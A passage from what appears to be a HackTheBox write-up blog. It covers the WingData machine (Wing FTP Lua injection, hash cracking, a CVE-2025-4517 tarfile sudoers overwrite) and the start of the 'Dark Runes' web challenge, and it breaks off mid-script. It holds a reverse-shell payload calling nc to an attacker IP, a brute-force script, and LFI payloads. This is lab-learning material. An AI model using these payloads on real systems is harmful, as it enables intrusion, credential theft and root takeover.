class="string">&quot;Content-Type: application/x-www-form-urlencoded&quot;</span> \</span><br><span class="line">  -d <span class="string">&quot;username=anonymous%00]]%0dlocal+h+%3d+io.popen(%22nc+10.10.15.30+1234+-e+/bin/bash%22)%0dlocal+r+%3d+h%3aread(%22*a%22)%0dh%3aclose()%0dprint(r)%0d--&amp;password=anonymous&amp;password_val=&quot;</span> \</span><br><span class="line">  -c /tmp/cookies_4.txt</span><br></pre></td></tr></table></figure><p>Then trigger the session:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -s -X POST <span class="string">&quot;http://ftp.wingdata.htb/dir.html&quot;</span> \</span><br><span class="line">  -b /tmp/cookies_4.txt</span><br></pre></td></tr></table></figure><blockquote><p>The server crashes (502 Proxy Error) — that’s expected. The crash means the shell connected outbound.</p></blockquote><p>Shell received as <code>wingftp</code>!</p><hr><h2 id="Lateral-Movement-—-Cracking-the-wacky-User’s-Password"><a href="#Lateral-Movement-—-Cracking-the-wacky-User’s-Password" class="headerlink" title="Lateral Movement — Cracking the wacky User’s Password"></a>Lateral Movement — Cracking the <code>wacky</code> User’s Password</h2><h3 id="Finding-Credentials-in-Wing-FTP-Config-Files"><a href="#Finding-Credentials-in-Wing-FTP-Config-Files" class="headerlink" title="Finding Credentials in Wing FTP Config Files"></a>Finding Credentials in Wing FTP Config Files</h3><p>Wing FTP stores its configuration and user accounts as XML files in <code>/opt/wftpserver/Data/</code>. Browsing the user account files:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wingftp@wingdata:/opt/wftpserver/Data/1/users$ <span class="built_in">cat</span> wacky.xml</span><br></pre></td></tr></table></figure><p>Inside <code>wacky.xml</code>, a SHA-256 password hash is stored:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Password</span>&gt;</span>32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca<span class="tag">&lt;/<span class="name">Password</span>&gt;</span></span><br></pre></td></tr></table></figure><p>The domain config (<code>domain.xml</code>) reveals salting is enabled with the salt <code>WingFTP</code>:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">EnablePasswordSalting</span>&gt;</span>1<span class="tag">&lt;/<span class="name">EnablePasswordSalting</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">SaltingString</span>&gt;</span>WingFTP<span class="tag">&lt;/<span class="name">SaltingString</span>&gt;</span></span><br></pre></td></tr></table></figure><p>So the hash format is <strong>SHA-256(password + “WingFTP”)</strong> — hashcat mode <code>1410</code>.</p><hr><h3 id="Cracking-with-Hashcat"><a href="#Cracking-with-Hashcat" class="headerlink" title="Cracking with Hashcat"></a>Cracking with Hashcat</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP&#x27;</span> &gt; wacky_hash.txt</span><br><span class="line"></span><br><span class="line">hashcat -m 1410 wacky_hash.txt /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure><p>Password cracked in <strong>6 seconds</strong>:</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">32940</span>defd<span class="number">3</span><span class="keyword">c</span><span class="number">3</span>ef<span class="number">70</span>a<span class="number">2</span>dd<span class="number">44</span>a<span class="number">5301</span>ff<span class="number">984</span><span class="keyword">c</span><span class="number">4742</span>f<span class="number">0</span>baae<span class="number">76</span>ff<span class="number">5</span>b<span class="number">8783994</span>f<span class="number">8</span>a<span class="number">503</span>ca:WingFTP:!<span class="variable">#7</span>Blushing^*Bride<span class="number">5</span></span><br></pre></td></tr></table></figure><hr><h3 id="SSH-as-wacky"><a href="#SSH-as-wacky" class="headerlink" title="SSH as wacky"></a>SSH as <code>wacky</code></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wingftp@wingdata:/opt/wftpserver/Data/1/users$ ssh wacky@localhost</span><br><span class="line"></span><br><span class="line">wacky@wingdata:~$ <span class="built_in">cat</span> user.txt</span><br><span class="line">528423035023ff2d4078ec7c06b47e3f</span><br></pre></td></tr></table></figure><p>🚩 <strong>User flag captured!</strong></p><hr><h2 id="Privilege-Escalation-—-CVE-2025-4517-Python-tarfile-Symlink-Bypass"><a href="#Privilege-Escalation-—-CVE-2025-4517-Python-tarfile-Symlink-Bypass" class="headerlink" title="Privilege Escalation — CVE-2025-4517 (Python tarfile Symlink Bypass)"></a>Privilege Escalation — CVE-2025-4517 (Python tarfile Symlink Bypass)</h2><h3 id="Checking-sudo-Permissions"><a href="#Checking-sudo-Permissions" class="headerlink" title="Checking sudo Permissions"></a>Checking sudo Permissions</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wacky@wingdata:~$ <span class="built_in">sudo</span> -l</span><br><span class="line"></span><br><span class="line">User wacky may run the following commands on wingdata:</span><br><span class="line">    (root) NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *</span><br></pre></td></tr></table></figure><p><code>wacky</code> can run a Python backup restoration script as <strong>root</strong>. Let’s read it.</p><hr><h3 id="Analysing-the-Vulnerable-Script"><a href="#Analysing-the-Vulnerable-Script" class="headerlink" title="Analysing the Vulnerable Script"></a>Analysing the Vulnerable Script</h3><p>The script <code>restore_backup_clients.py</code> does the following:</p><ol><li>Validates the backup filename with a regex (<code>backup_&lt;digits&gt;.tar</code>)</li><li>Validates the restore directory name</li><li>Opens the tar file and extracts it using:</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> tarfile.<span class="built_in">open</span>(backup_path, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> tar:</span><br><span class="line">    tar.extractall(path=staging_dir, <span class="built_in">filter</span>=<span class="string">&quot;data&quot;</span>)</span><br></pre></td></tr></table></figure><p>The <code>filter=&quot;data&quot;</code> was introduced in Python 3.12 as a <em>safety measure</em> — but <strong>CVE-2025-4517</strong> bypasses it entirely.</p><hr><h3 id="What-is-CVE-2025-4517"><a href="#What-is-CVE-2025-4517" class="headerlink" title="What is CVE-2025-4517?"></a>What is CVE-2025-4517?</h3><blockquote><p><strong>CVE-2025-4517</strong> is a critical Python <code>tarfile</code> vulnerability affecting versions <strong>3.8.0 – 3.13.1</strong>. Even with <code>filter=&quot;data&quot;</code> applied, a crafted tar archive can use a combination of <strong>symlinks</strong> and <strong>hardlinks</strong> to write arbitrary content to locations outside the extraction directory — including <code>/etc/sudoers</code>.</p></blockquote><p><strong>Attack flow:</strong></p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> Create deep nested <span class="built_in">directories</span> (<span class="number">247</span>-<span class="keyword">char</span> names × <span class="number">16</span> levels deep)</span><br><span class="line">   → Confuses <span class="keyword">the</span> path resolution engine</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> Build <span class="keyword">a</span> symlink chain pointing up through <span class="keyword">the</span> tree</span><br><span class="line">   → Effectively traverses out <span class="keyword">of</span> <span class="keyword">the</span> extraction root</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span> Create <span class="keyword">an</span> <span class="string">&quot;escape&quot;</span> symlink resolving <span class="built_in">to</span> /etc</span><br><span class="line">   → Points outside <span class="keyword">the</span> sandbox boundary</span><br><span class="line"></span><br><span class="line"><span class="number">4.</span> Create <span class="keyword">a</span> hardlink through <span class="keyword">the</span> escape symlink <span class="built_in">to</span> /etc/sudoers</span><br><span class="line">   → hardlink <span class="string">&quot;sudoers_link&quot;</span> → escape/sudoers → /etc/sudoers</span><br><span class="line"></span><br><span class="line"><span class="number">5.</span> Write content <span class="built_in">to</span> <span class="keyword">the</span> hardlink entry <span class="keyword">in</span> <span class="keyword">the</span> tar</span><br><span class="line">   → Content lands directly <span class="keyword">in</span> /etc/sudoers</span><br></pre></td></tr></table></figure><p>The key insight: <code>filter=&quot;data&quot;</code> blocks absolute paths and <code>..</code> traversal in <em>filenames</em>, but it doesn’t fully track the <strong>resolved destination</strong> of a chain of symlinks followed by a hardlink. The hardlink ends up pointing at the same inode as <code>/etc/sudoers</code>.</p><hr><h3 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h3><p>Clone the public PoC on your attack machine and serve it:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/AzureADTrent/CVE-2025-4517-POC-HTB-WingData.git</span><br><span class="line"><span class="built_in">cd</span> CVE-2025-4517-POC-HTB-WingData</span><br><span class="line">python3 -m http.server 9000</span><br></pre></td></tr></table></figure><p>On the target, download and run it:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wacky@wingdata:~$ wget http://10.10.15.30:9000/CVE-2025-4517-POC.py</span><br><span class="line">wacky@wingdata:~$ python3 CVE-2025-4517-POC.py</span><br></pre></td></tr></table></figure><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">╔═══════════════════════════════════════════════════════════╗</span><br><span class="line">║     <span class="symbol">CVE</span><span class="number">-2025</span><span class="number">-4517</span> <span class="symbol">Tarfile</span> <span class="symbol">Exploit</span>                         ║</span><br><span class="line">║     <span class="symbol">Privilege</span> <span class="symbol">Escalation</span> via <span class="symbol">Symlink</span> + <span class="symbol">Hardlink</span> <span class="symbol">Bypass</span>    ║</span><br><span class="line">╚═══════════════════════════════════════════════════════════╝</span><br><span class="line"></span><br><span class="line">[*] <span class="symbol">Phase</span> <span class="number">1</span>: <span class="symbol">Building</span> nested directory structure...</span><br><span class="line">[*] <span class="symbol">Phase</span> <span class="number">2</span>: <span class="symbol">Creating</span> symlink chain for path traversal...</span><br><span class="line">[*] <span class="symbol">Phase</span> <span class="number">3</span>: <span class="symbol">Creating</span> escape symlink to /etc...</span><br><span class="line">[*] <span class="symbol">Phase</span> <span class="number">4</span>: <span class="symbol">Creating</span> hardlink to /etc/sudoers...</span><br><span class="line">[*] <span class="symbol">Phase</span> <span class="number">5</span>: <span class="symbol">Writing</span> sudoers entry...</span><br><span class="line">[+] <span class="symbol">Exploit</span> tar created: /tmp/cve_2025_4517_exploit.tar</span><br><span class="line">[+] <span class="symbol">Exploit</span> deployed successfully</span><br><span class="line">[+] <span class="symbol">Extraction</span> completed in /opt/backup_clients/restored_backups/restore_pwn_9999</span><br><span class="line"></span><br><span class="line">[+] <span class="symbol">SUCCESS</span>! <span class="symbol">User</span> <span class="string">&#x27;wacky&#x27;</span> added to sudoers</span><br><span class="line">[+] <span class="symbol">Entry</span>: wacky <span class="symbol">ALL</span>=(<span class="symbol">ALL</span>) <span class="symbol">NOPASSWD</span>: <span class="symbol">ALL</span></span><br><span class="line"></span><br><span class="line">[+] <span class="symbol">EXPLOITATION</span> <span class="symbol">SUCCESSFUL</span>!</span><br><span class="line">[?] <span class="symbol">Spawn</span> root shell now? (y/n): y</span><br><span class="line"></span><br><span class="line">root@wingdata:/home/wacky# cat /root/root.txt</span><br><span class="line">b414dd33c4ad9d3541f2202f81f7149e</span><br></pre></td></tr></table></figure><p>🚩 <strong>Root flag captured!</strong></p><hr><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><table><thead><tr><th>Stage</th><th>Technique</th><th>CVE</th></tr></thead><tbody><tr><td><strong>Foothold</strong></td><td>Null byte injection → Lua code execution in session file → Reverse shell</td><td>CVE-2025-47812</td></tr><tr><td><strong>Lateral Movement</strong></td><td>Wing FTP XML config → SHA-256 salted hash → hashcat → SSH as <code>wacky</code></td><td>—</td></tr><tr><td><strong>Privilege Escalation</strong></td><td>Python tarfile symlink+hardlink bypass → arbitrary write to <code>/etc/sudoers</code> → root</td><td>CVE-2025-4517</td></tr></tbody></table><hr><h2 id="Key-Takeaways"><a href="#Key-Takeaways" class="headerlink" title="Key Takeaways"></a>Key Takeaways</h2><ul><li><strong>Null byte handling</strong> is a classic but still dangerous mistake. Any user-supplied string that gets written to a file or interpreted as code must be sanitised <em>before</em> storage, not just at auth-check time.</li><li><strong>Session files as Lua code</strong> is an inherently risky design — user-controlled data should never be treated as executable.</li><li><strong><code>filter=&quot;data&quot;</code> is not a silver bullet.</strong> Python’s tarfile safety filters were a step in the right direction, but CVE-2025-4517 showed that multi-step symlink+hardlink chains can still escape the sandbox. Always validate final resolved paths, not just the raw names in the archive.</li><li><strong>Credential reuse in config files</strong> is a common post-exploitation win — always check service config directories for stored credentials.</li></ul><hr><p>Have a nice day, and see you in the next writeup!<br>Any feedback in the comments section is very appreciated. 🙏</p>]]></content>
      
      
      <categories>
          
          <category> HackTheBox </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HackTheBox </tag>
            
            <tag> Linux </tag>
            
            <tag> RCE </tag>
            
            <tag> CVE-2025-47812 </tag>
            
            <tag> CVE-2025-4517 </tag>
            
            <tag> Wing FTP </tag>
            
            <tag> Null Byte Injection </tag>
            
            <tag> Tarfile </tag>
            
            <tag> Privilege Escalation </tag>
            
            <tag> Password Cracking </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Dark Runes</title>
      <link href="/2026/06/20/Dark-Runes/"/>
      <url>/2026/06/20/Dark-Runes/</url>
      
        <content type="html"><![CDATA[<blockquote><p><strong>Difficulty</strong>: <span style="color:#9fef00">Easy</span> &nbsp;|&nbsp; <strong>Category</strong>: <span style="color:#9fef00">Web</span></p></blockquote><h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>A Node.js web application that lets users create documents and export them as PDFs, guarded by an admin-only debug endpoint. The goal is to read <code>/flag.txt</code> from the server by chaining three vulnerabilities together.</p><span id="more"></span><hr><h2 id="Initial-Code-Analysis"><a href="#Initial-Code-Analysis" class="headerlink" title="Initial Code Analysis"></a>Initial Code Analysis</h2><p>After downloading the challenge source, the following key files stood out:</p><h3 id="Key-Files"><a href="#Key-Files" class="headerlink" title="Key Files"></a>Key Files</h3><p><strong><code>package.json</code></strong> — Revealed critical dependencies:</p><ul><li><code>express</code> — Web framework</li><li><code>better-sqlite3</code> — Database</li><li><code>markdown-pdf@11.0.0</code> — PDF generation <strong>(vulnerable)</strong></li><li><code>node-html-markdown</code> — HTML to markdown conversion</li><li><code>sanitize-html</code> — HTML sanitization</li></ul><p><strong><code>crypto.js</code></strong> — Cookie generation logic:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">generateCookie</span> = (<span class="params">username, id</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> stringifiedUser = <span class="title function_">btoa</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123; username, id &#125;));</span><br><span class="line">  <span class="keyword">const</span> sig = <span class="title function_">signString</span>(stringifiedUser);</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`<span class="subst">$&#123;stringifiedUser&#125;</span>-<span class="subst">$&#123;sig&#125;</span>`</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong><code>middlewares.js</code></strong> — Admin check:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">isAdmin</span> = (<span class="params">req, res, next</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">if</span> (req.<span class="property">user</span>.<span class="property">username</span> === <span class="string">&quot;admin&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">next</span>();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">send</span>(<span class="string">&quot;Forbidden&quot;</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong><code>pass.js</code></strong> — Access pass management:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">rotatePass</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">    <span class="variable constant_">ACCESS_PASS</span> = <span class="title function_">generateAccessCode</span>(); <span class="comment">// 4-digit number as string</span></span><br><span class="line">    fs.<span class="title function_">writeFileSync</span>(<span class="title class_">String</span>(<span class="variable constant_">ACCESS_PASS</span>), <span class="string">`You Access Code is &quot;<span class="subst">$&#123;generateRandomString(<span class="number">4</span>)&#125;</span>&quot;...`</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">verifyPass</span> = (<span class="params">pass</span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (!fs.<span class="title function_">existsSync</span>(<span class="variable constant_">ACCESS_PASS</span>)) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">const</span> currName = fs.<span class="title function_">readFileSync</span>(<span class="variable constant_">ACCESS_PASS</span>, &#123; <span class="attr">encoding</span>: <span class="string">&quot;utf-8&quot;</span> &#125;);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable constant_">ACCESS_PASS</span> === pass; <span class="comment">// Compares with FILENAME, not content!</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong><code>generate.js</code></strong> — Debug endpoint:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">router.<span class="title function_">post</span>(<span class="string">&quot;/document/debug/export&quot;</span>, isAuthenticated, isAdmin, <span class="title function_">async</span> (req, res) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; access_pass, content &#125; = req.<span class="property">body</span>;</span><br><span class="line">  <span class="keyword">if</span> (!<span class="title function_">verifyPass</span>(access_pass)) &#123;</span><br><span class="line">    <span class="title function_">rotatePass</span>();</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">send</span>(<span class="string">&quot;BAD PASS&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">const</span> generatedPDF = <span class="keyword">await</span> <span class="title function_">generatePDF</span>(content);</span><br><span class="line">  <span class="keyword">return</span> res.<span class="title function_">send</span>(generatedPDF);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><strong><code>exporter.js</code></strong> — PDF generation:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">generatePDF</span> = <span class="keyword">async</span> (<span class="params">content</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="title function_">markdownpdf</span>(&#123; <span class="attr">remarkable</span>: &#123; <span class="attr">html</span>: <span class="literal">true</span> &#125; &#125;)</span><br><span class="line">      .<span class="property">from</span>.<span class="title function_">string</span>(content)</span><br><span class="line">      .<span class="property">to</span>.<span class="title function_">buffer</span>(<span class="literal">undefined</span>, <span class="function">(<span class="params">err, buffer</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (err != <span class="literal">null</span>) <span class="keyword">return</span> <span class="title function_">reject</span>(err);</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">resolve</span>(buffer);</span><br><span class="line">      &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><hr><h2 id="Vulnerabilities-Identified"><a href="#Vulnerabilities-Identified" class="headerlink" title="Vulnerabilities Identified"></a>Vulnerabilities Identified</h2><h3 id="1-Weak-Access-Pass-4-digit-brute-force"><a href="#1-Weak-Access-Pass-4-digit-brute-force" class="headerlink" title="1. Weak Access Pass (4-digit brute force)"></a>1. Weak Access Pass (4-digit brute force)</h3><p>The <code>generateAccessCode()</code> function creates a 4-digit code (0000–9999), only <strong>10,000 possibilities</strong>. This is trivially brute-forceable.</p><h3 id="2-Local-File-Inclusion-via-PDF-Generation"><a href="#2-Local-File-Inclusion-via-PDF-Generation" class="headerlink" title="2. Local File Inclusion via PDF Generation"></a>2. Local File Inclusion via PDF Generation</h3><p>The <code>markdown-pdf</code> library with <code>{ remarkable: { html: true } }</code> allows raw HTML injection. The underlying <strong>PhantomJS</strong> renderer follows <code>&lt;iframe src&gt;</code> attributes, enabling reading of local files directly from the filesystem.</p><h3 id="3-Admin-Registration-Possible"><a href="#3-Admin-Registration-Possible" class="headerlink" title="3. Admin Registration Possible"></a>3. Admin Registration Possible</h3><p>No restrictions prevented registering as <code>admin</code> if the account didn’t already exist in the database.</p><hr><h2 id="Exploitation-Steps"><a href="#Exploitation-Steps" class="headerlink" title="Exploitation Steps"></a>Exploitation Steps</h2><h3 id="Step-1-Register-as-Admin"><a href="#Step-1-Register-as-Admin" class="headerlink" title="Step 1: Register as Admin"></a>Step 1: Register as Admin</h3><p>The admin account didn’t exist initially, so registration was possible:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST http://target:port/register \</span><br><span class="line">  -d <span class="string">&quot;username=admin&amp;password=1112&quot;</span></span><br></pre></td></tr></table></figure><p>Login to obtain the cookie:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST http://target:port/login \</span><br><span class="line">  -d <span class="string">&quot;username=admin&amp;password=1112&quot;</span> \</span><br><span class="line">  -c cookies.txt</span><br></pre></td></tr></table></figure><p><strong>Cookie obtained:</strong></p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJ<span class="number">1</span><span class="keyword">c</span><span class="number">2</span>VybmFtZSI<span class="number">6</span>ImFkbWluIiwiaWQiOjF<span class="number">9</span><span class="number">-19</span>dca<span class="number">7e4</span>ba<span class="number">74</span>ad<span class="number">6</span><span class="keyword">c</span><span class="number">867044992</span><span class="keyword">c</span><span class="number">6</span><span class="keyword">c</span><span class="number">9</span>ea<span class="number">99</span>b<span class="number">609</span>cf<span class="number">5</span>a<span class="number">629619</span>ba<span class="number">15</span>a<span class="number">19</span>b<span class="number">6</span>cb<span class="number">57</span>cb<span class="number">37</span></span><br></pre></td></tr></table></figure><hr><h3 id="Step-2-Brute-Force-the-Access-Pass"><a href="#Step-2-Brute-Force-the-Access-Pass" class="headerlink" title="Step 2: Brute Force the Access Pass"></a>Step 2: Brute Force the Access Pass</h3><p>The debug endpoint requires a 4-digit access pass. Script to brute force:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">target = <span class="string">&quot;http://&lt;target&gt;:&lt;port&gt;&quot;</span></span><br><span class="line">cookie = <span class="string">&quot;eyJ1c2VybmFtZSI6ImFkbWluIiwiaWQiOjF9-19dca7e4ba74ad6c867044992c6c9ea99b609cf5a629619ba15a19b6cb57cb37&quot;</span></span><br><span class="line"></span><br><span class="line">session = requests.Session()</span><br><span class="line">session.cookies.<span class="built_in">set</span>(<span class="string">&quot;user&quot;</span>, cookie)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Brute forcing 4-digit access code...&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> code <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10000</span>):</span><br><span class="line">    pass_code = <span class="string">f&quot;<span class="subst">&#123;code:04d&#125;</span>&quot;</span></span><br><span class="line">    data = &#123;<span class="string">&quot;access_pass&quot;</span>: pass_code, <span class="string">&quot;content&quot;</span>: <span class="string">&quot;test&quot;</span>&#125;</span><br><span class="line">    r = session.post(<span class="string">f&quot;<span class="subst">&#123;target&#125;</span>/document/debug/export&quot;</span>, data=data)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\n✅ FOUND: <span class="subst">&#123;pass_code&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> code % <span class="number">1000</span> == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Tried <span class="subst">&#123;code&#125;</span> codes...&quot;</span>)</span><br></pre></td></tr></table></figure><p><strong>Result:</strong> Access pass <code>0130</code> was discovered.</p><hr><h3 id="Step-3-Find-Working-Payload"><a href="#Step-3-Find-Working-Payload" class="headerlink" title="Step 3: Find Working Payload"></a>Step 3: Find Working Payload</h3><p>The debug endpoint accepts any markdown&#x2F;HTML content and generates a PDF. Multiple payloads were tested to read <code>/flag.txt</code>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">payloads = [</span><br><span class="line">    <span class="string">&quot;![](/flag.txt)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&lt;img src=&#x27;/flag.txt&#x27;&gt;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&lt;iframe src=&#x27;/flag.txt&#x27;&gt;&lt;/iframe&gt;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&lt;script&gt;fetch(&#x27;/flag.txt&#x27;).then(r=&gt;r.text()).then(d=&gt;document.write(d))&lt;/script&gt;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&#123;&#123; config &#125;&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;$&#123;file.read(&#x27;/flag.txt&#x27;)&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&#123;% include &#x27;/flag.txt&#x27; %&#125;&quot;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i, content <span class="keyword">in</span> <span class="built_in">enumerate</span>(payloads):</span><br><span class="line">    data = &#123;<span class="string">&quot;access_pass&quot;</span>: <span class="string">&quot;0130&quot;</span>, <span 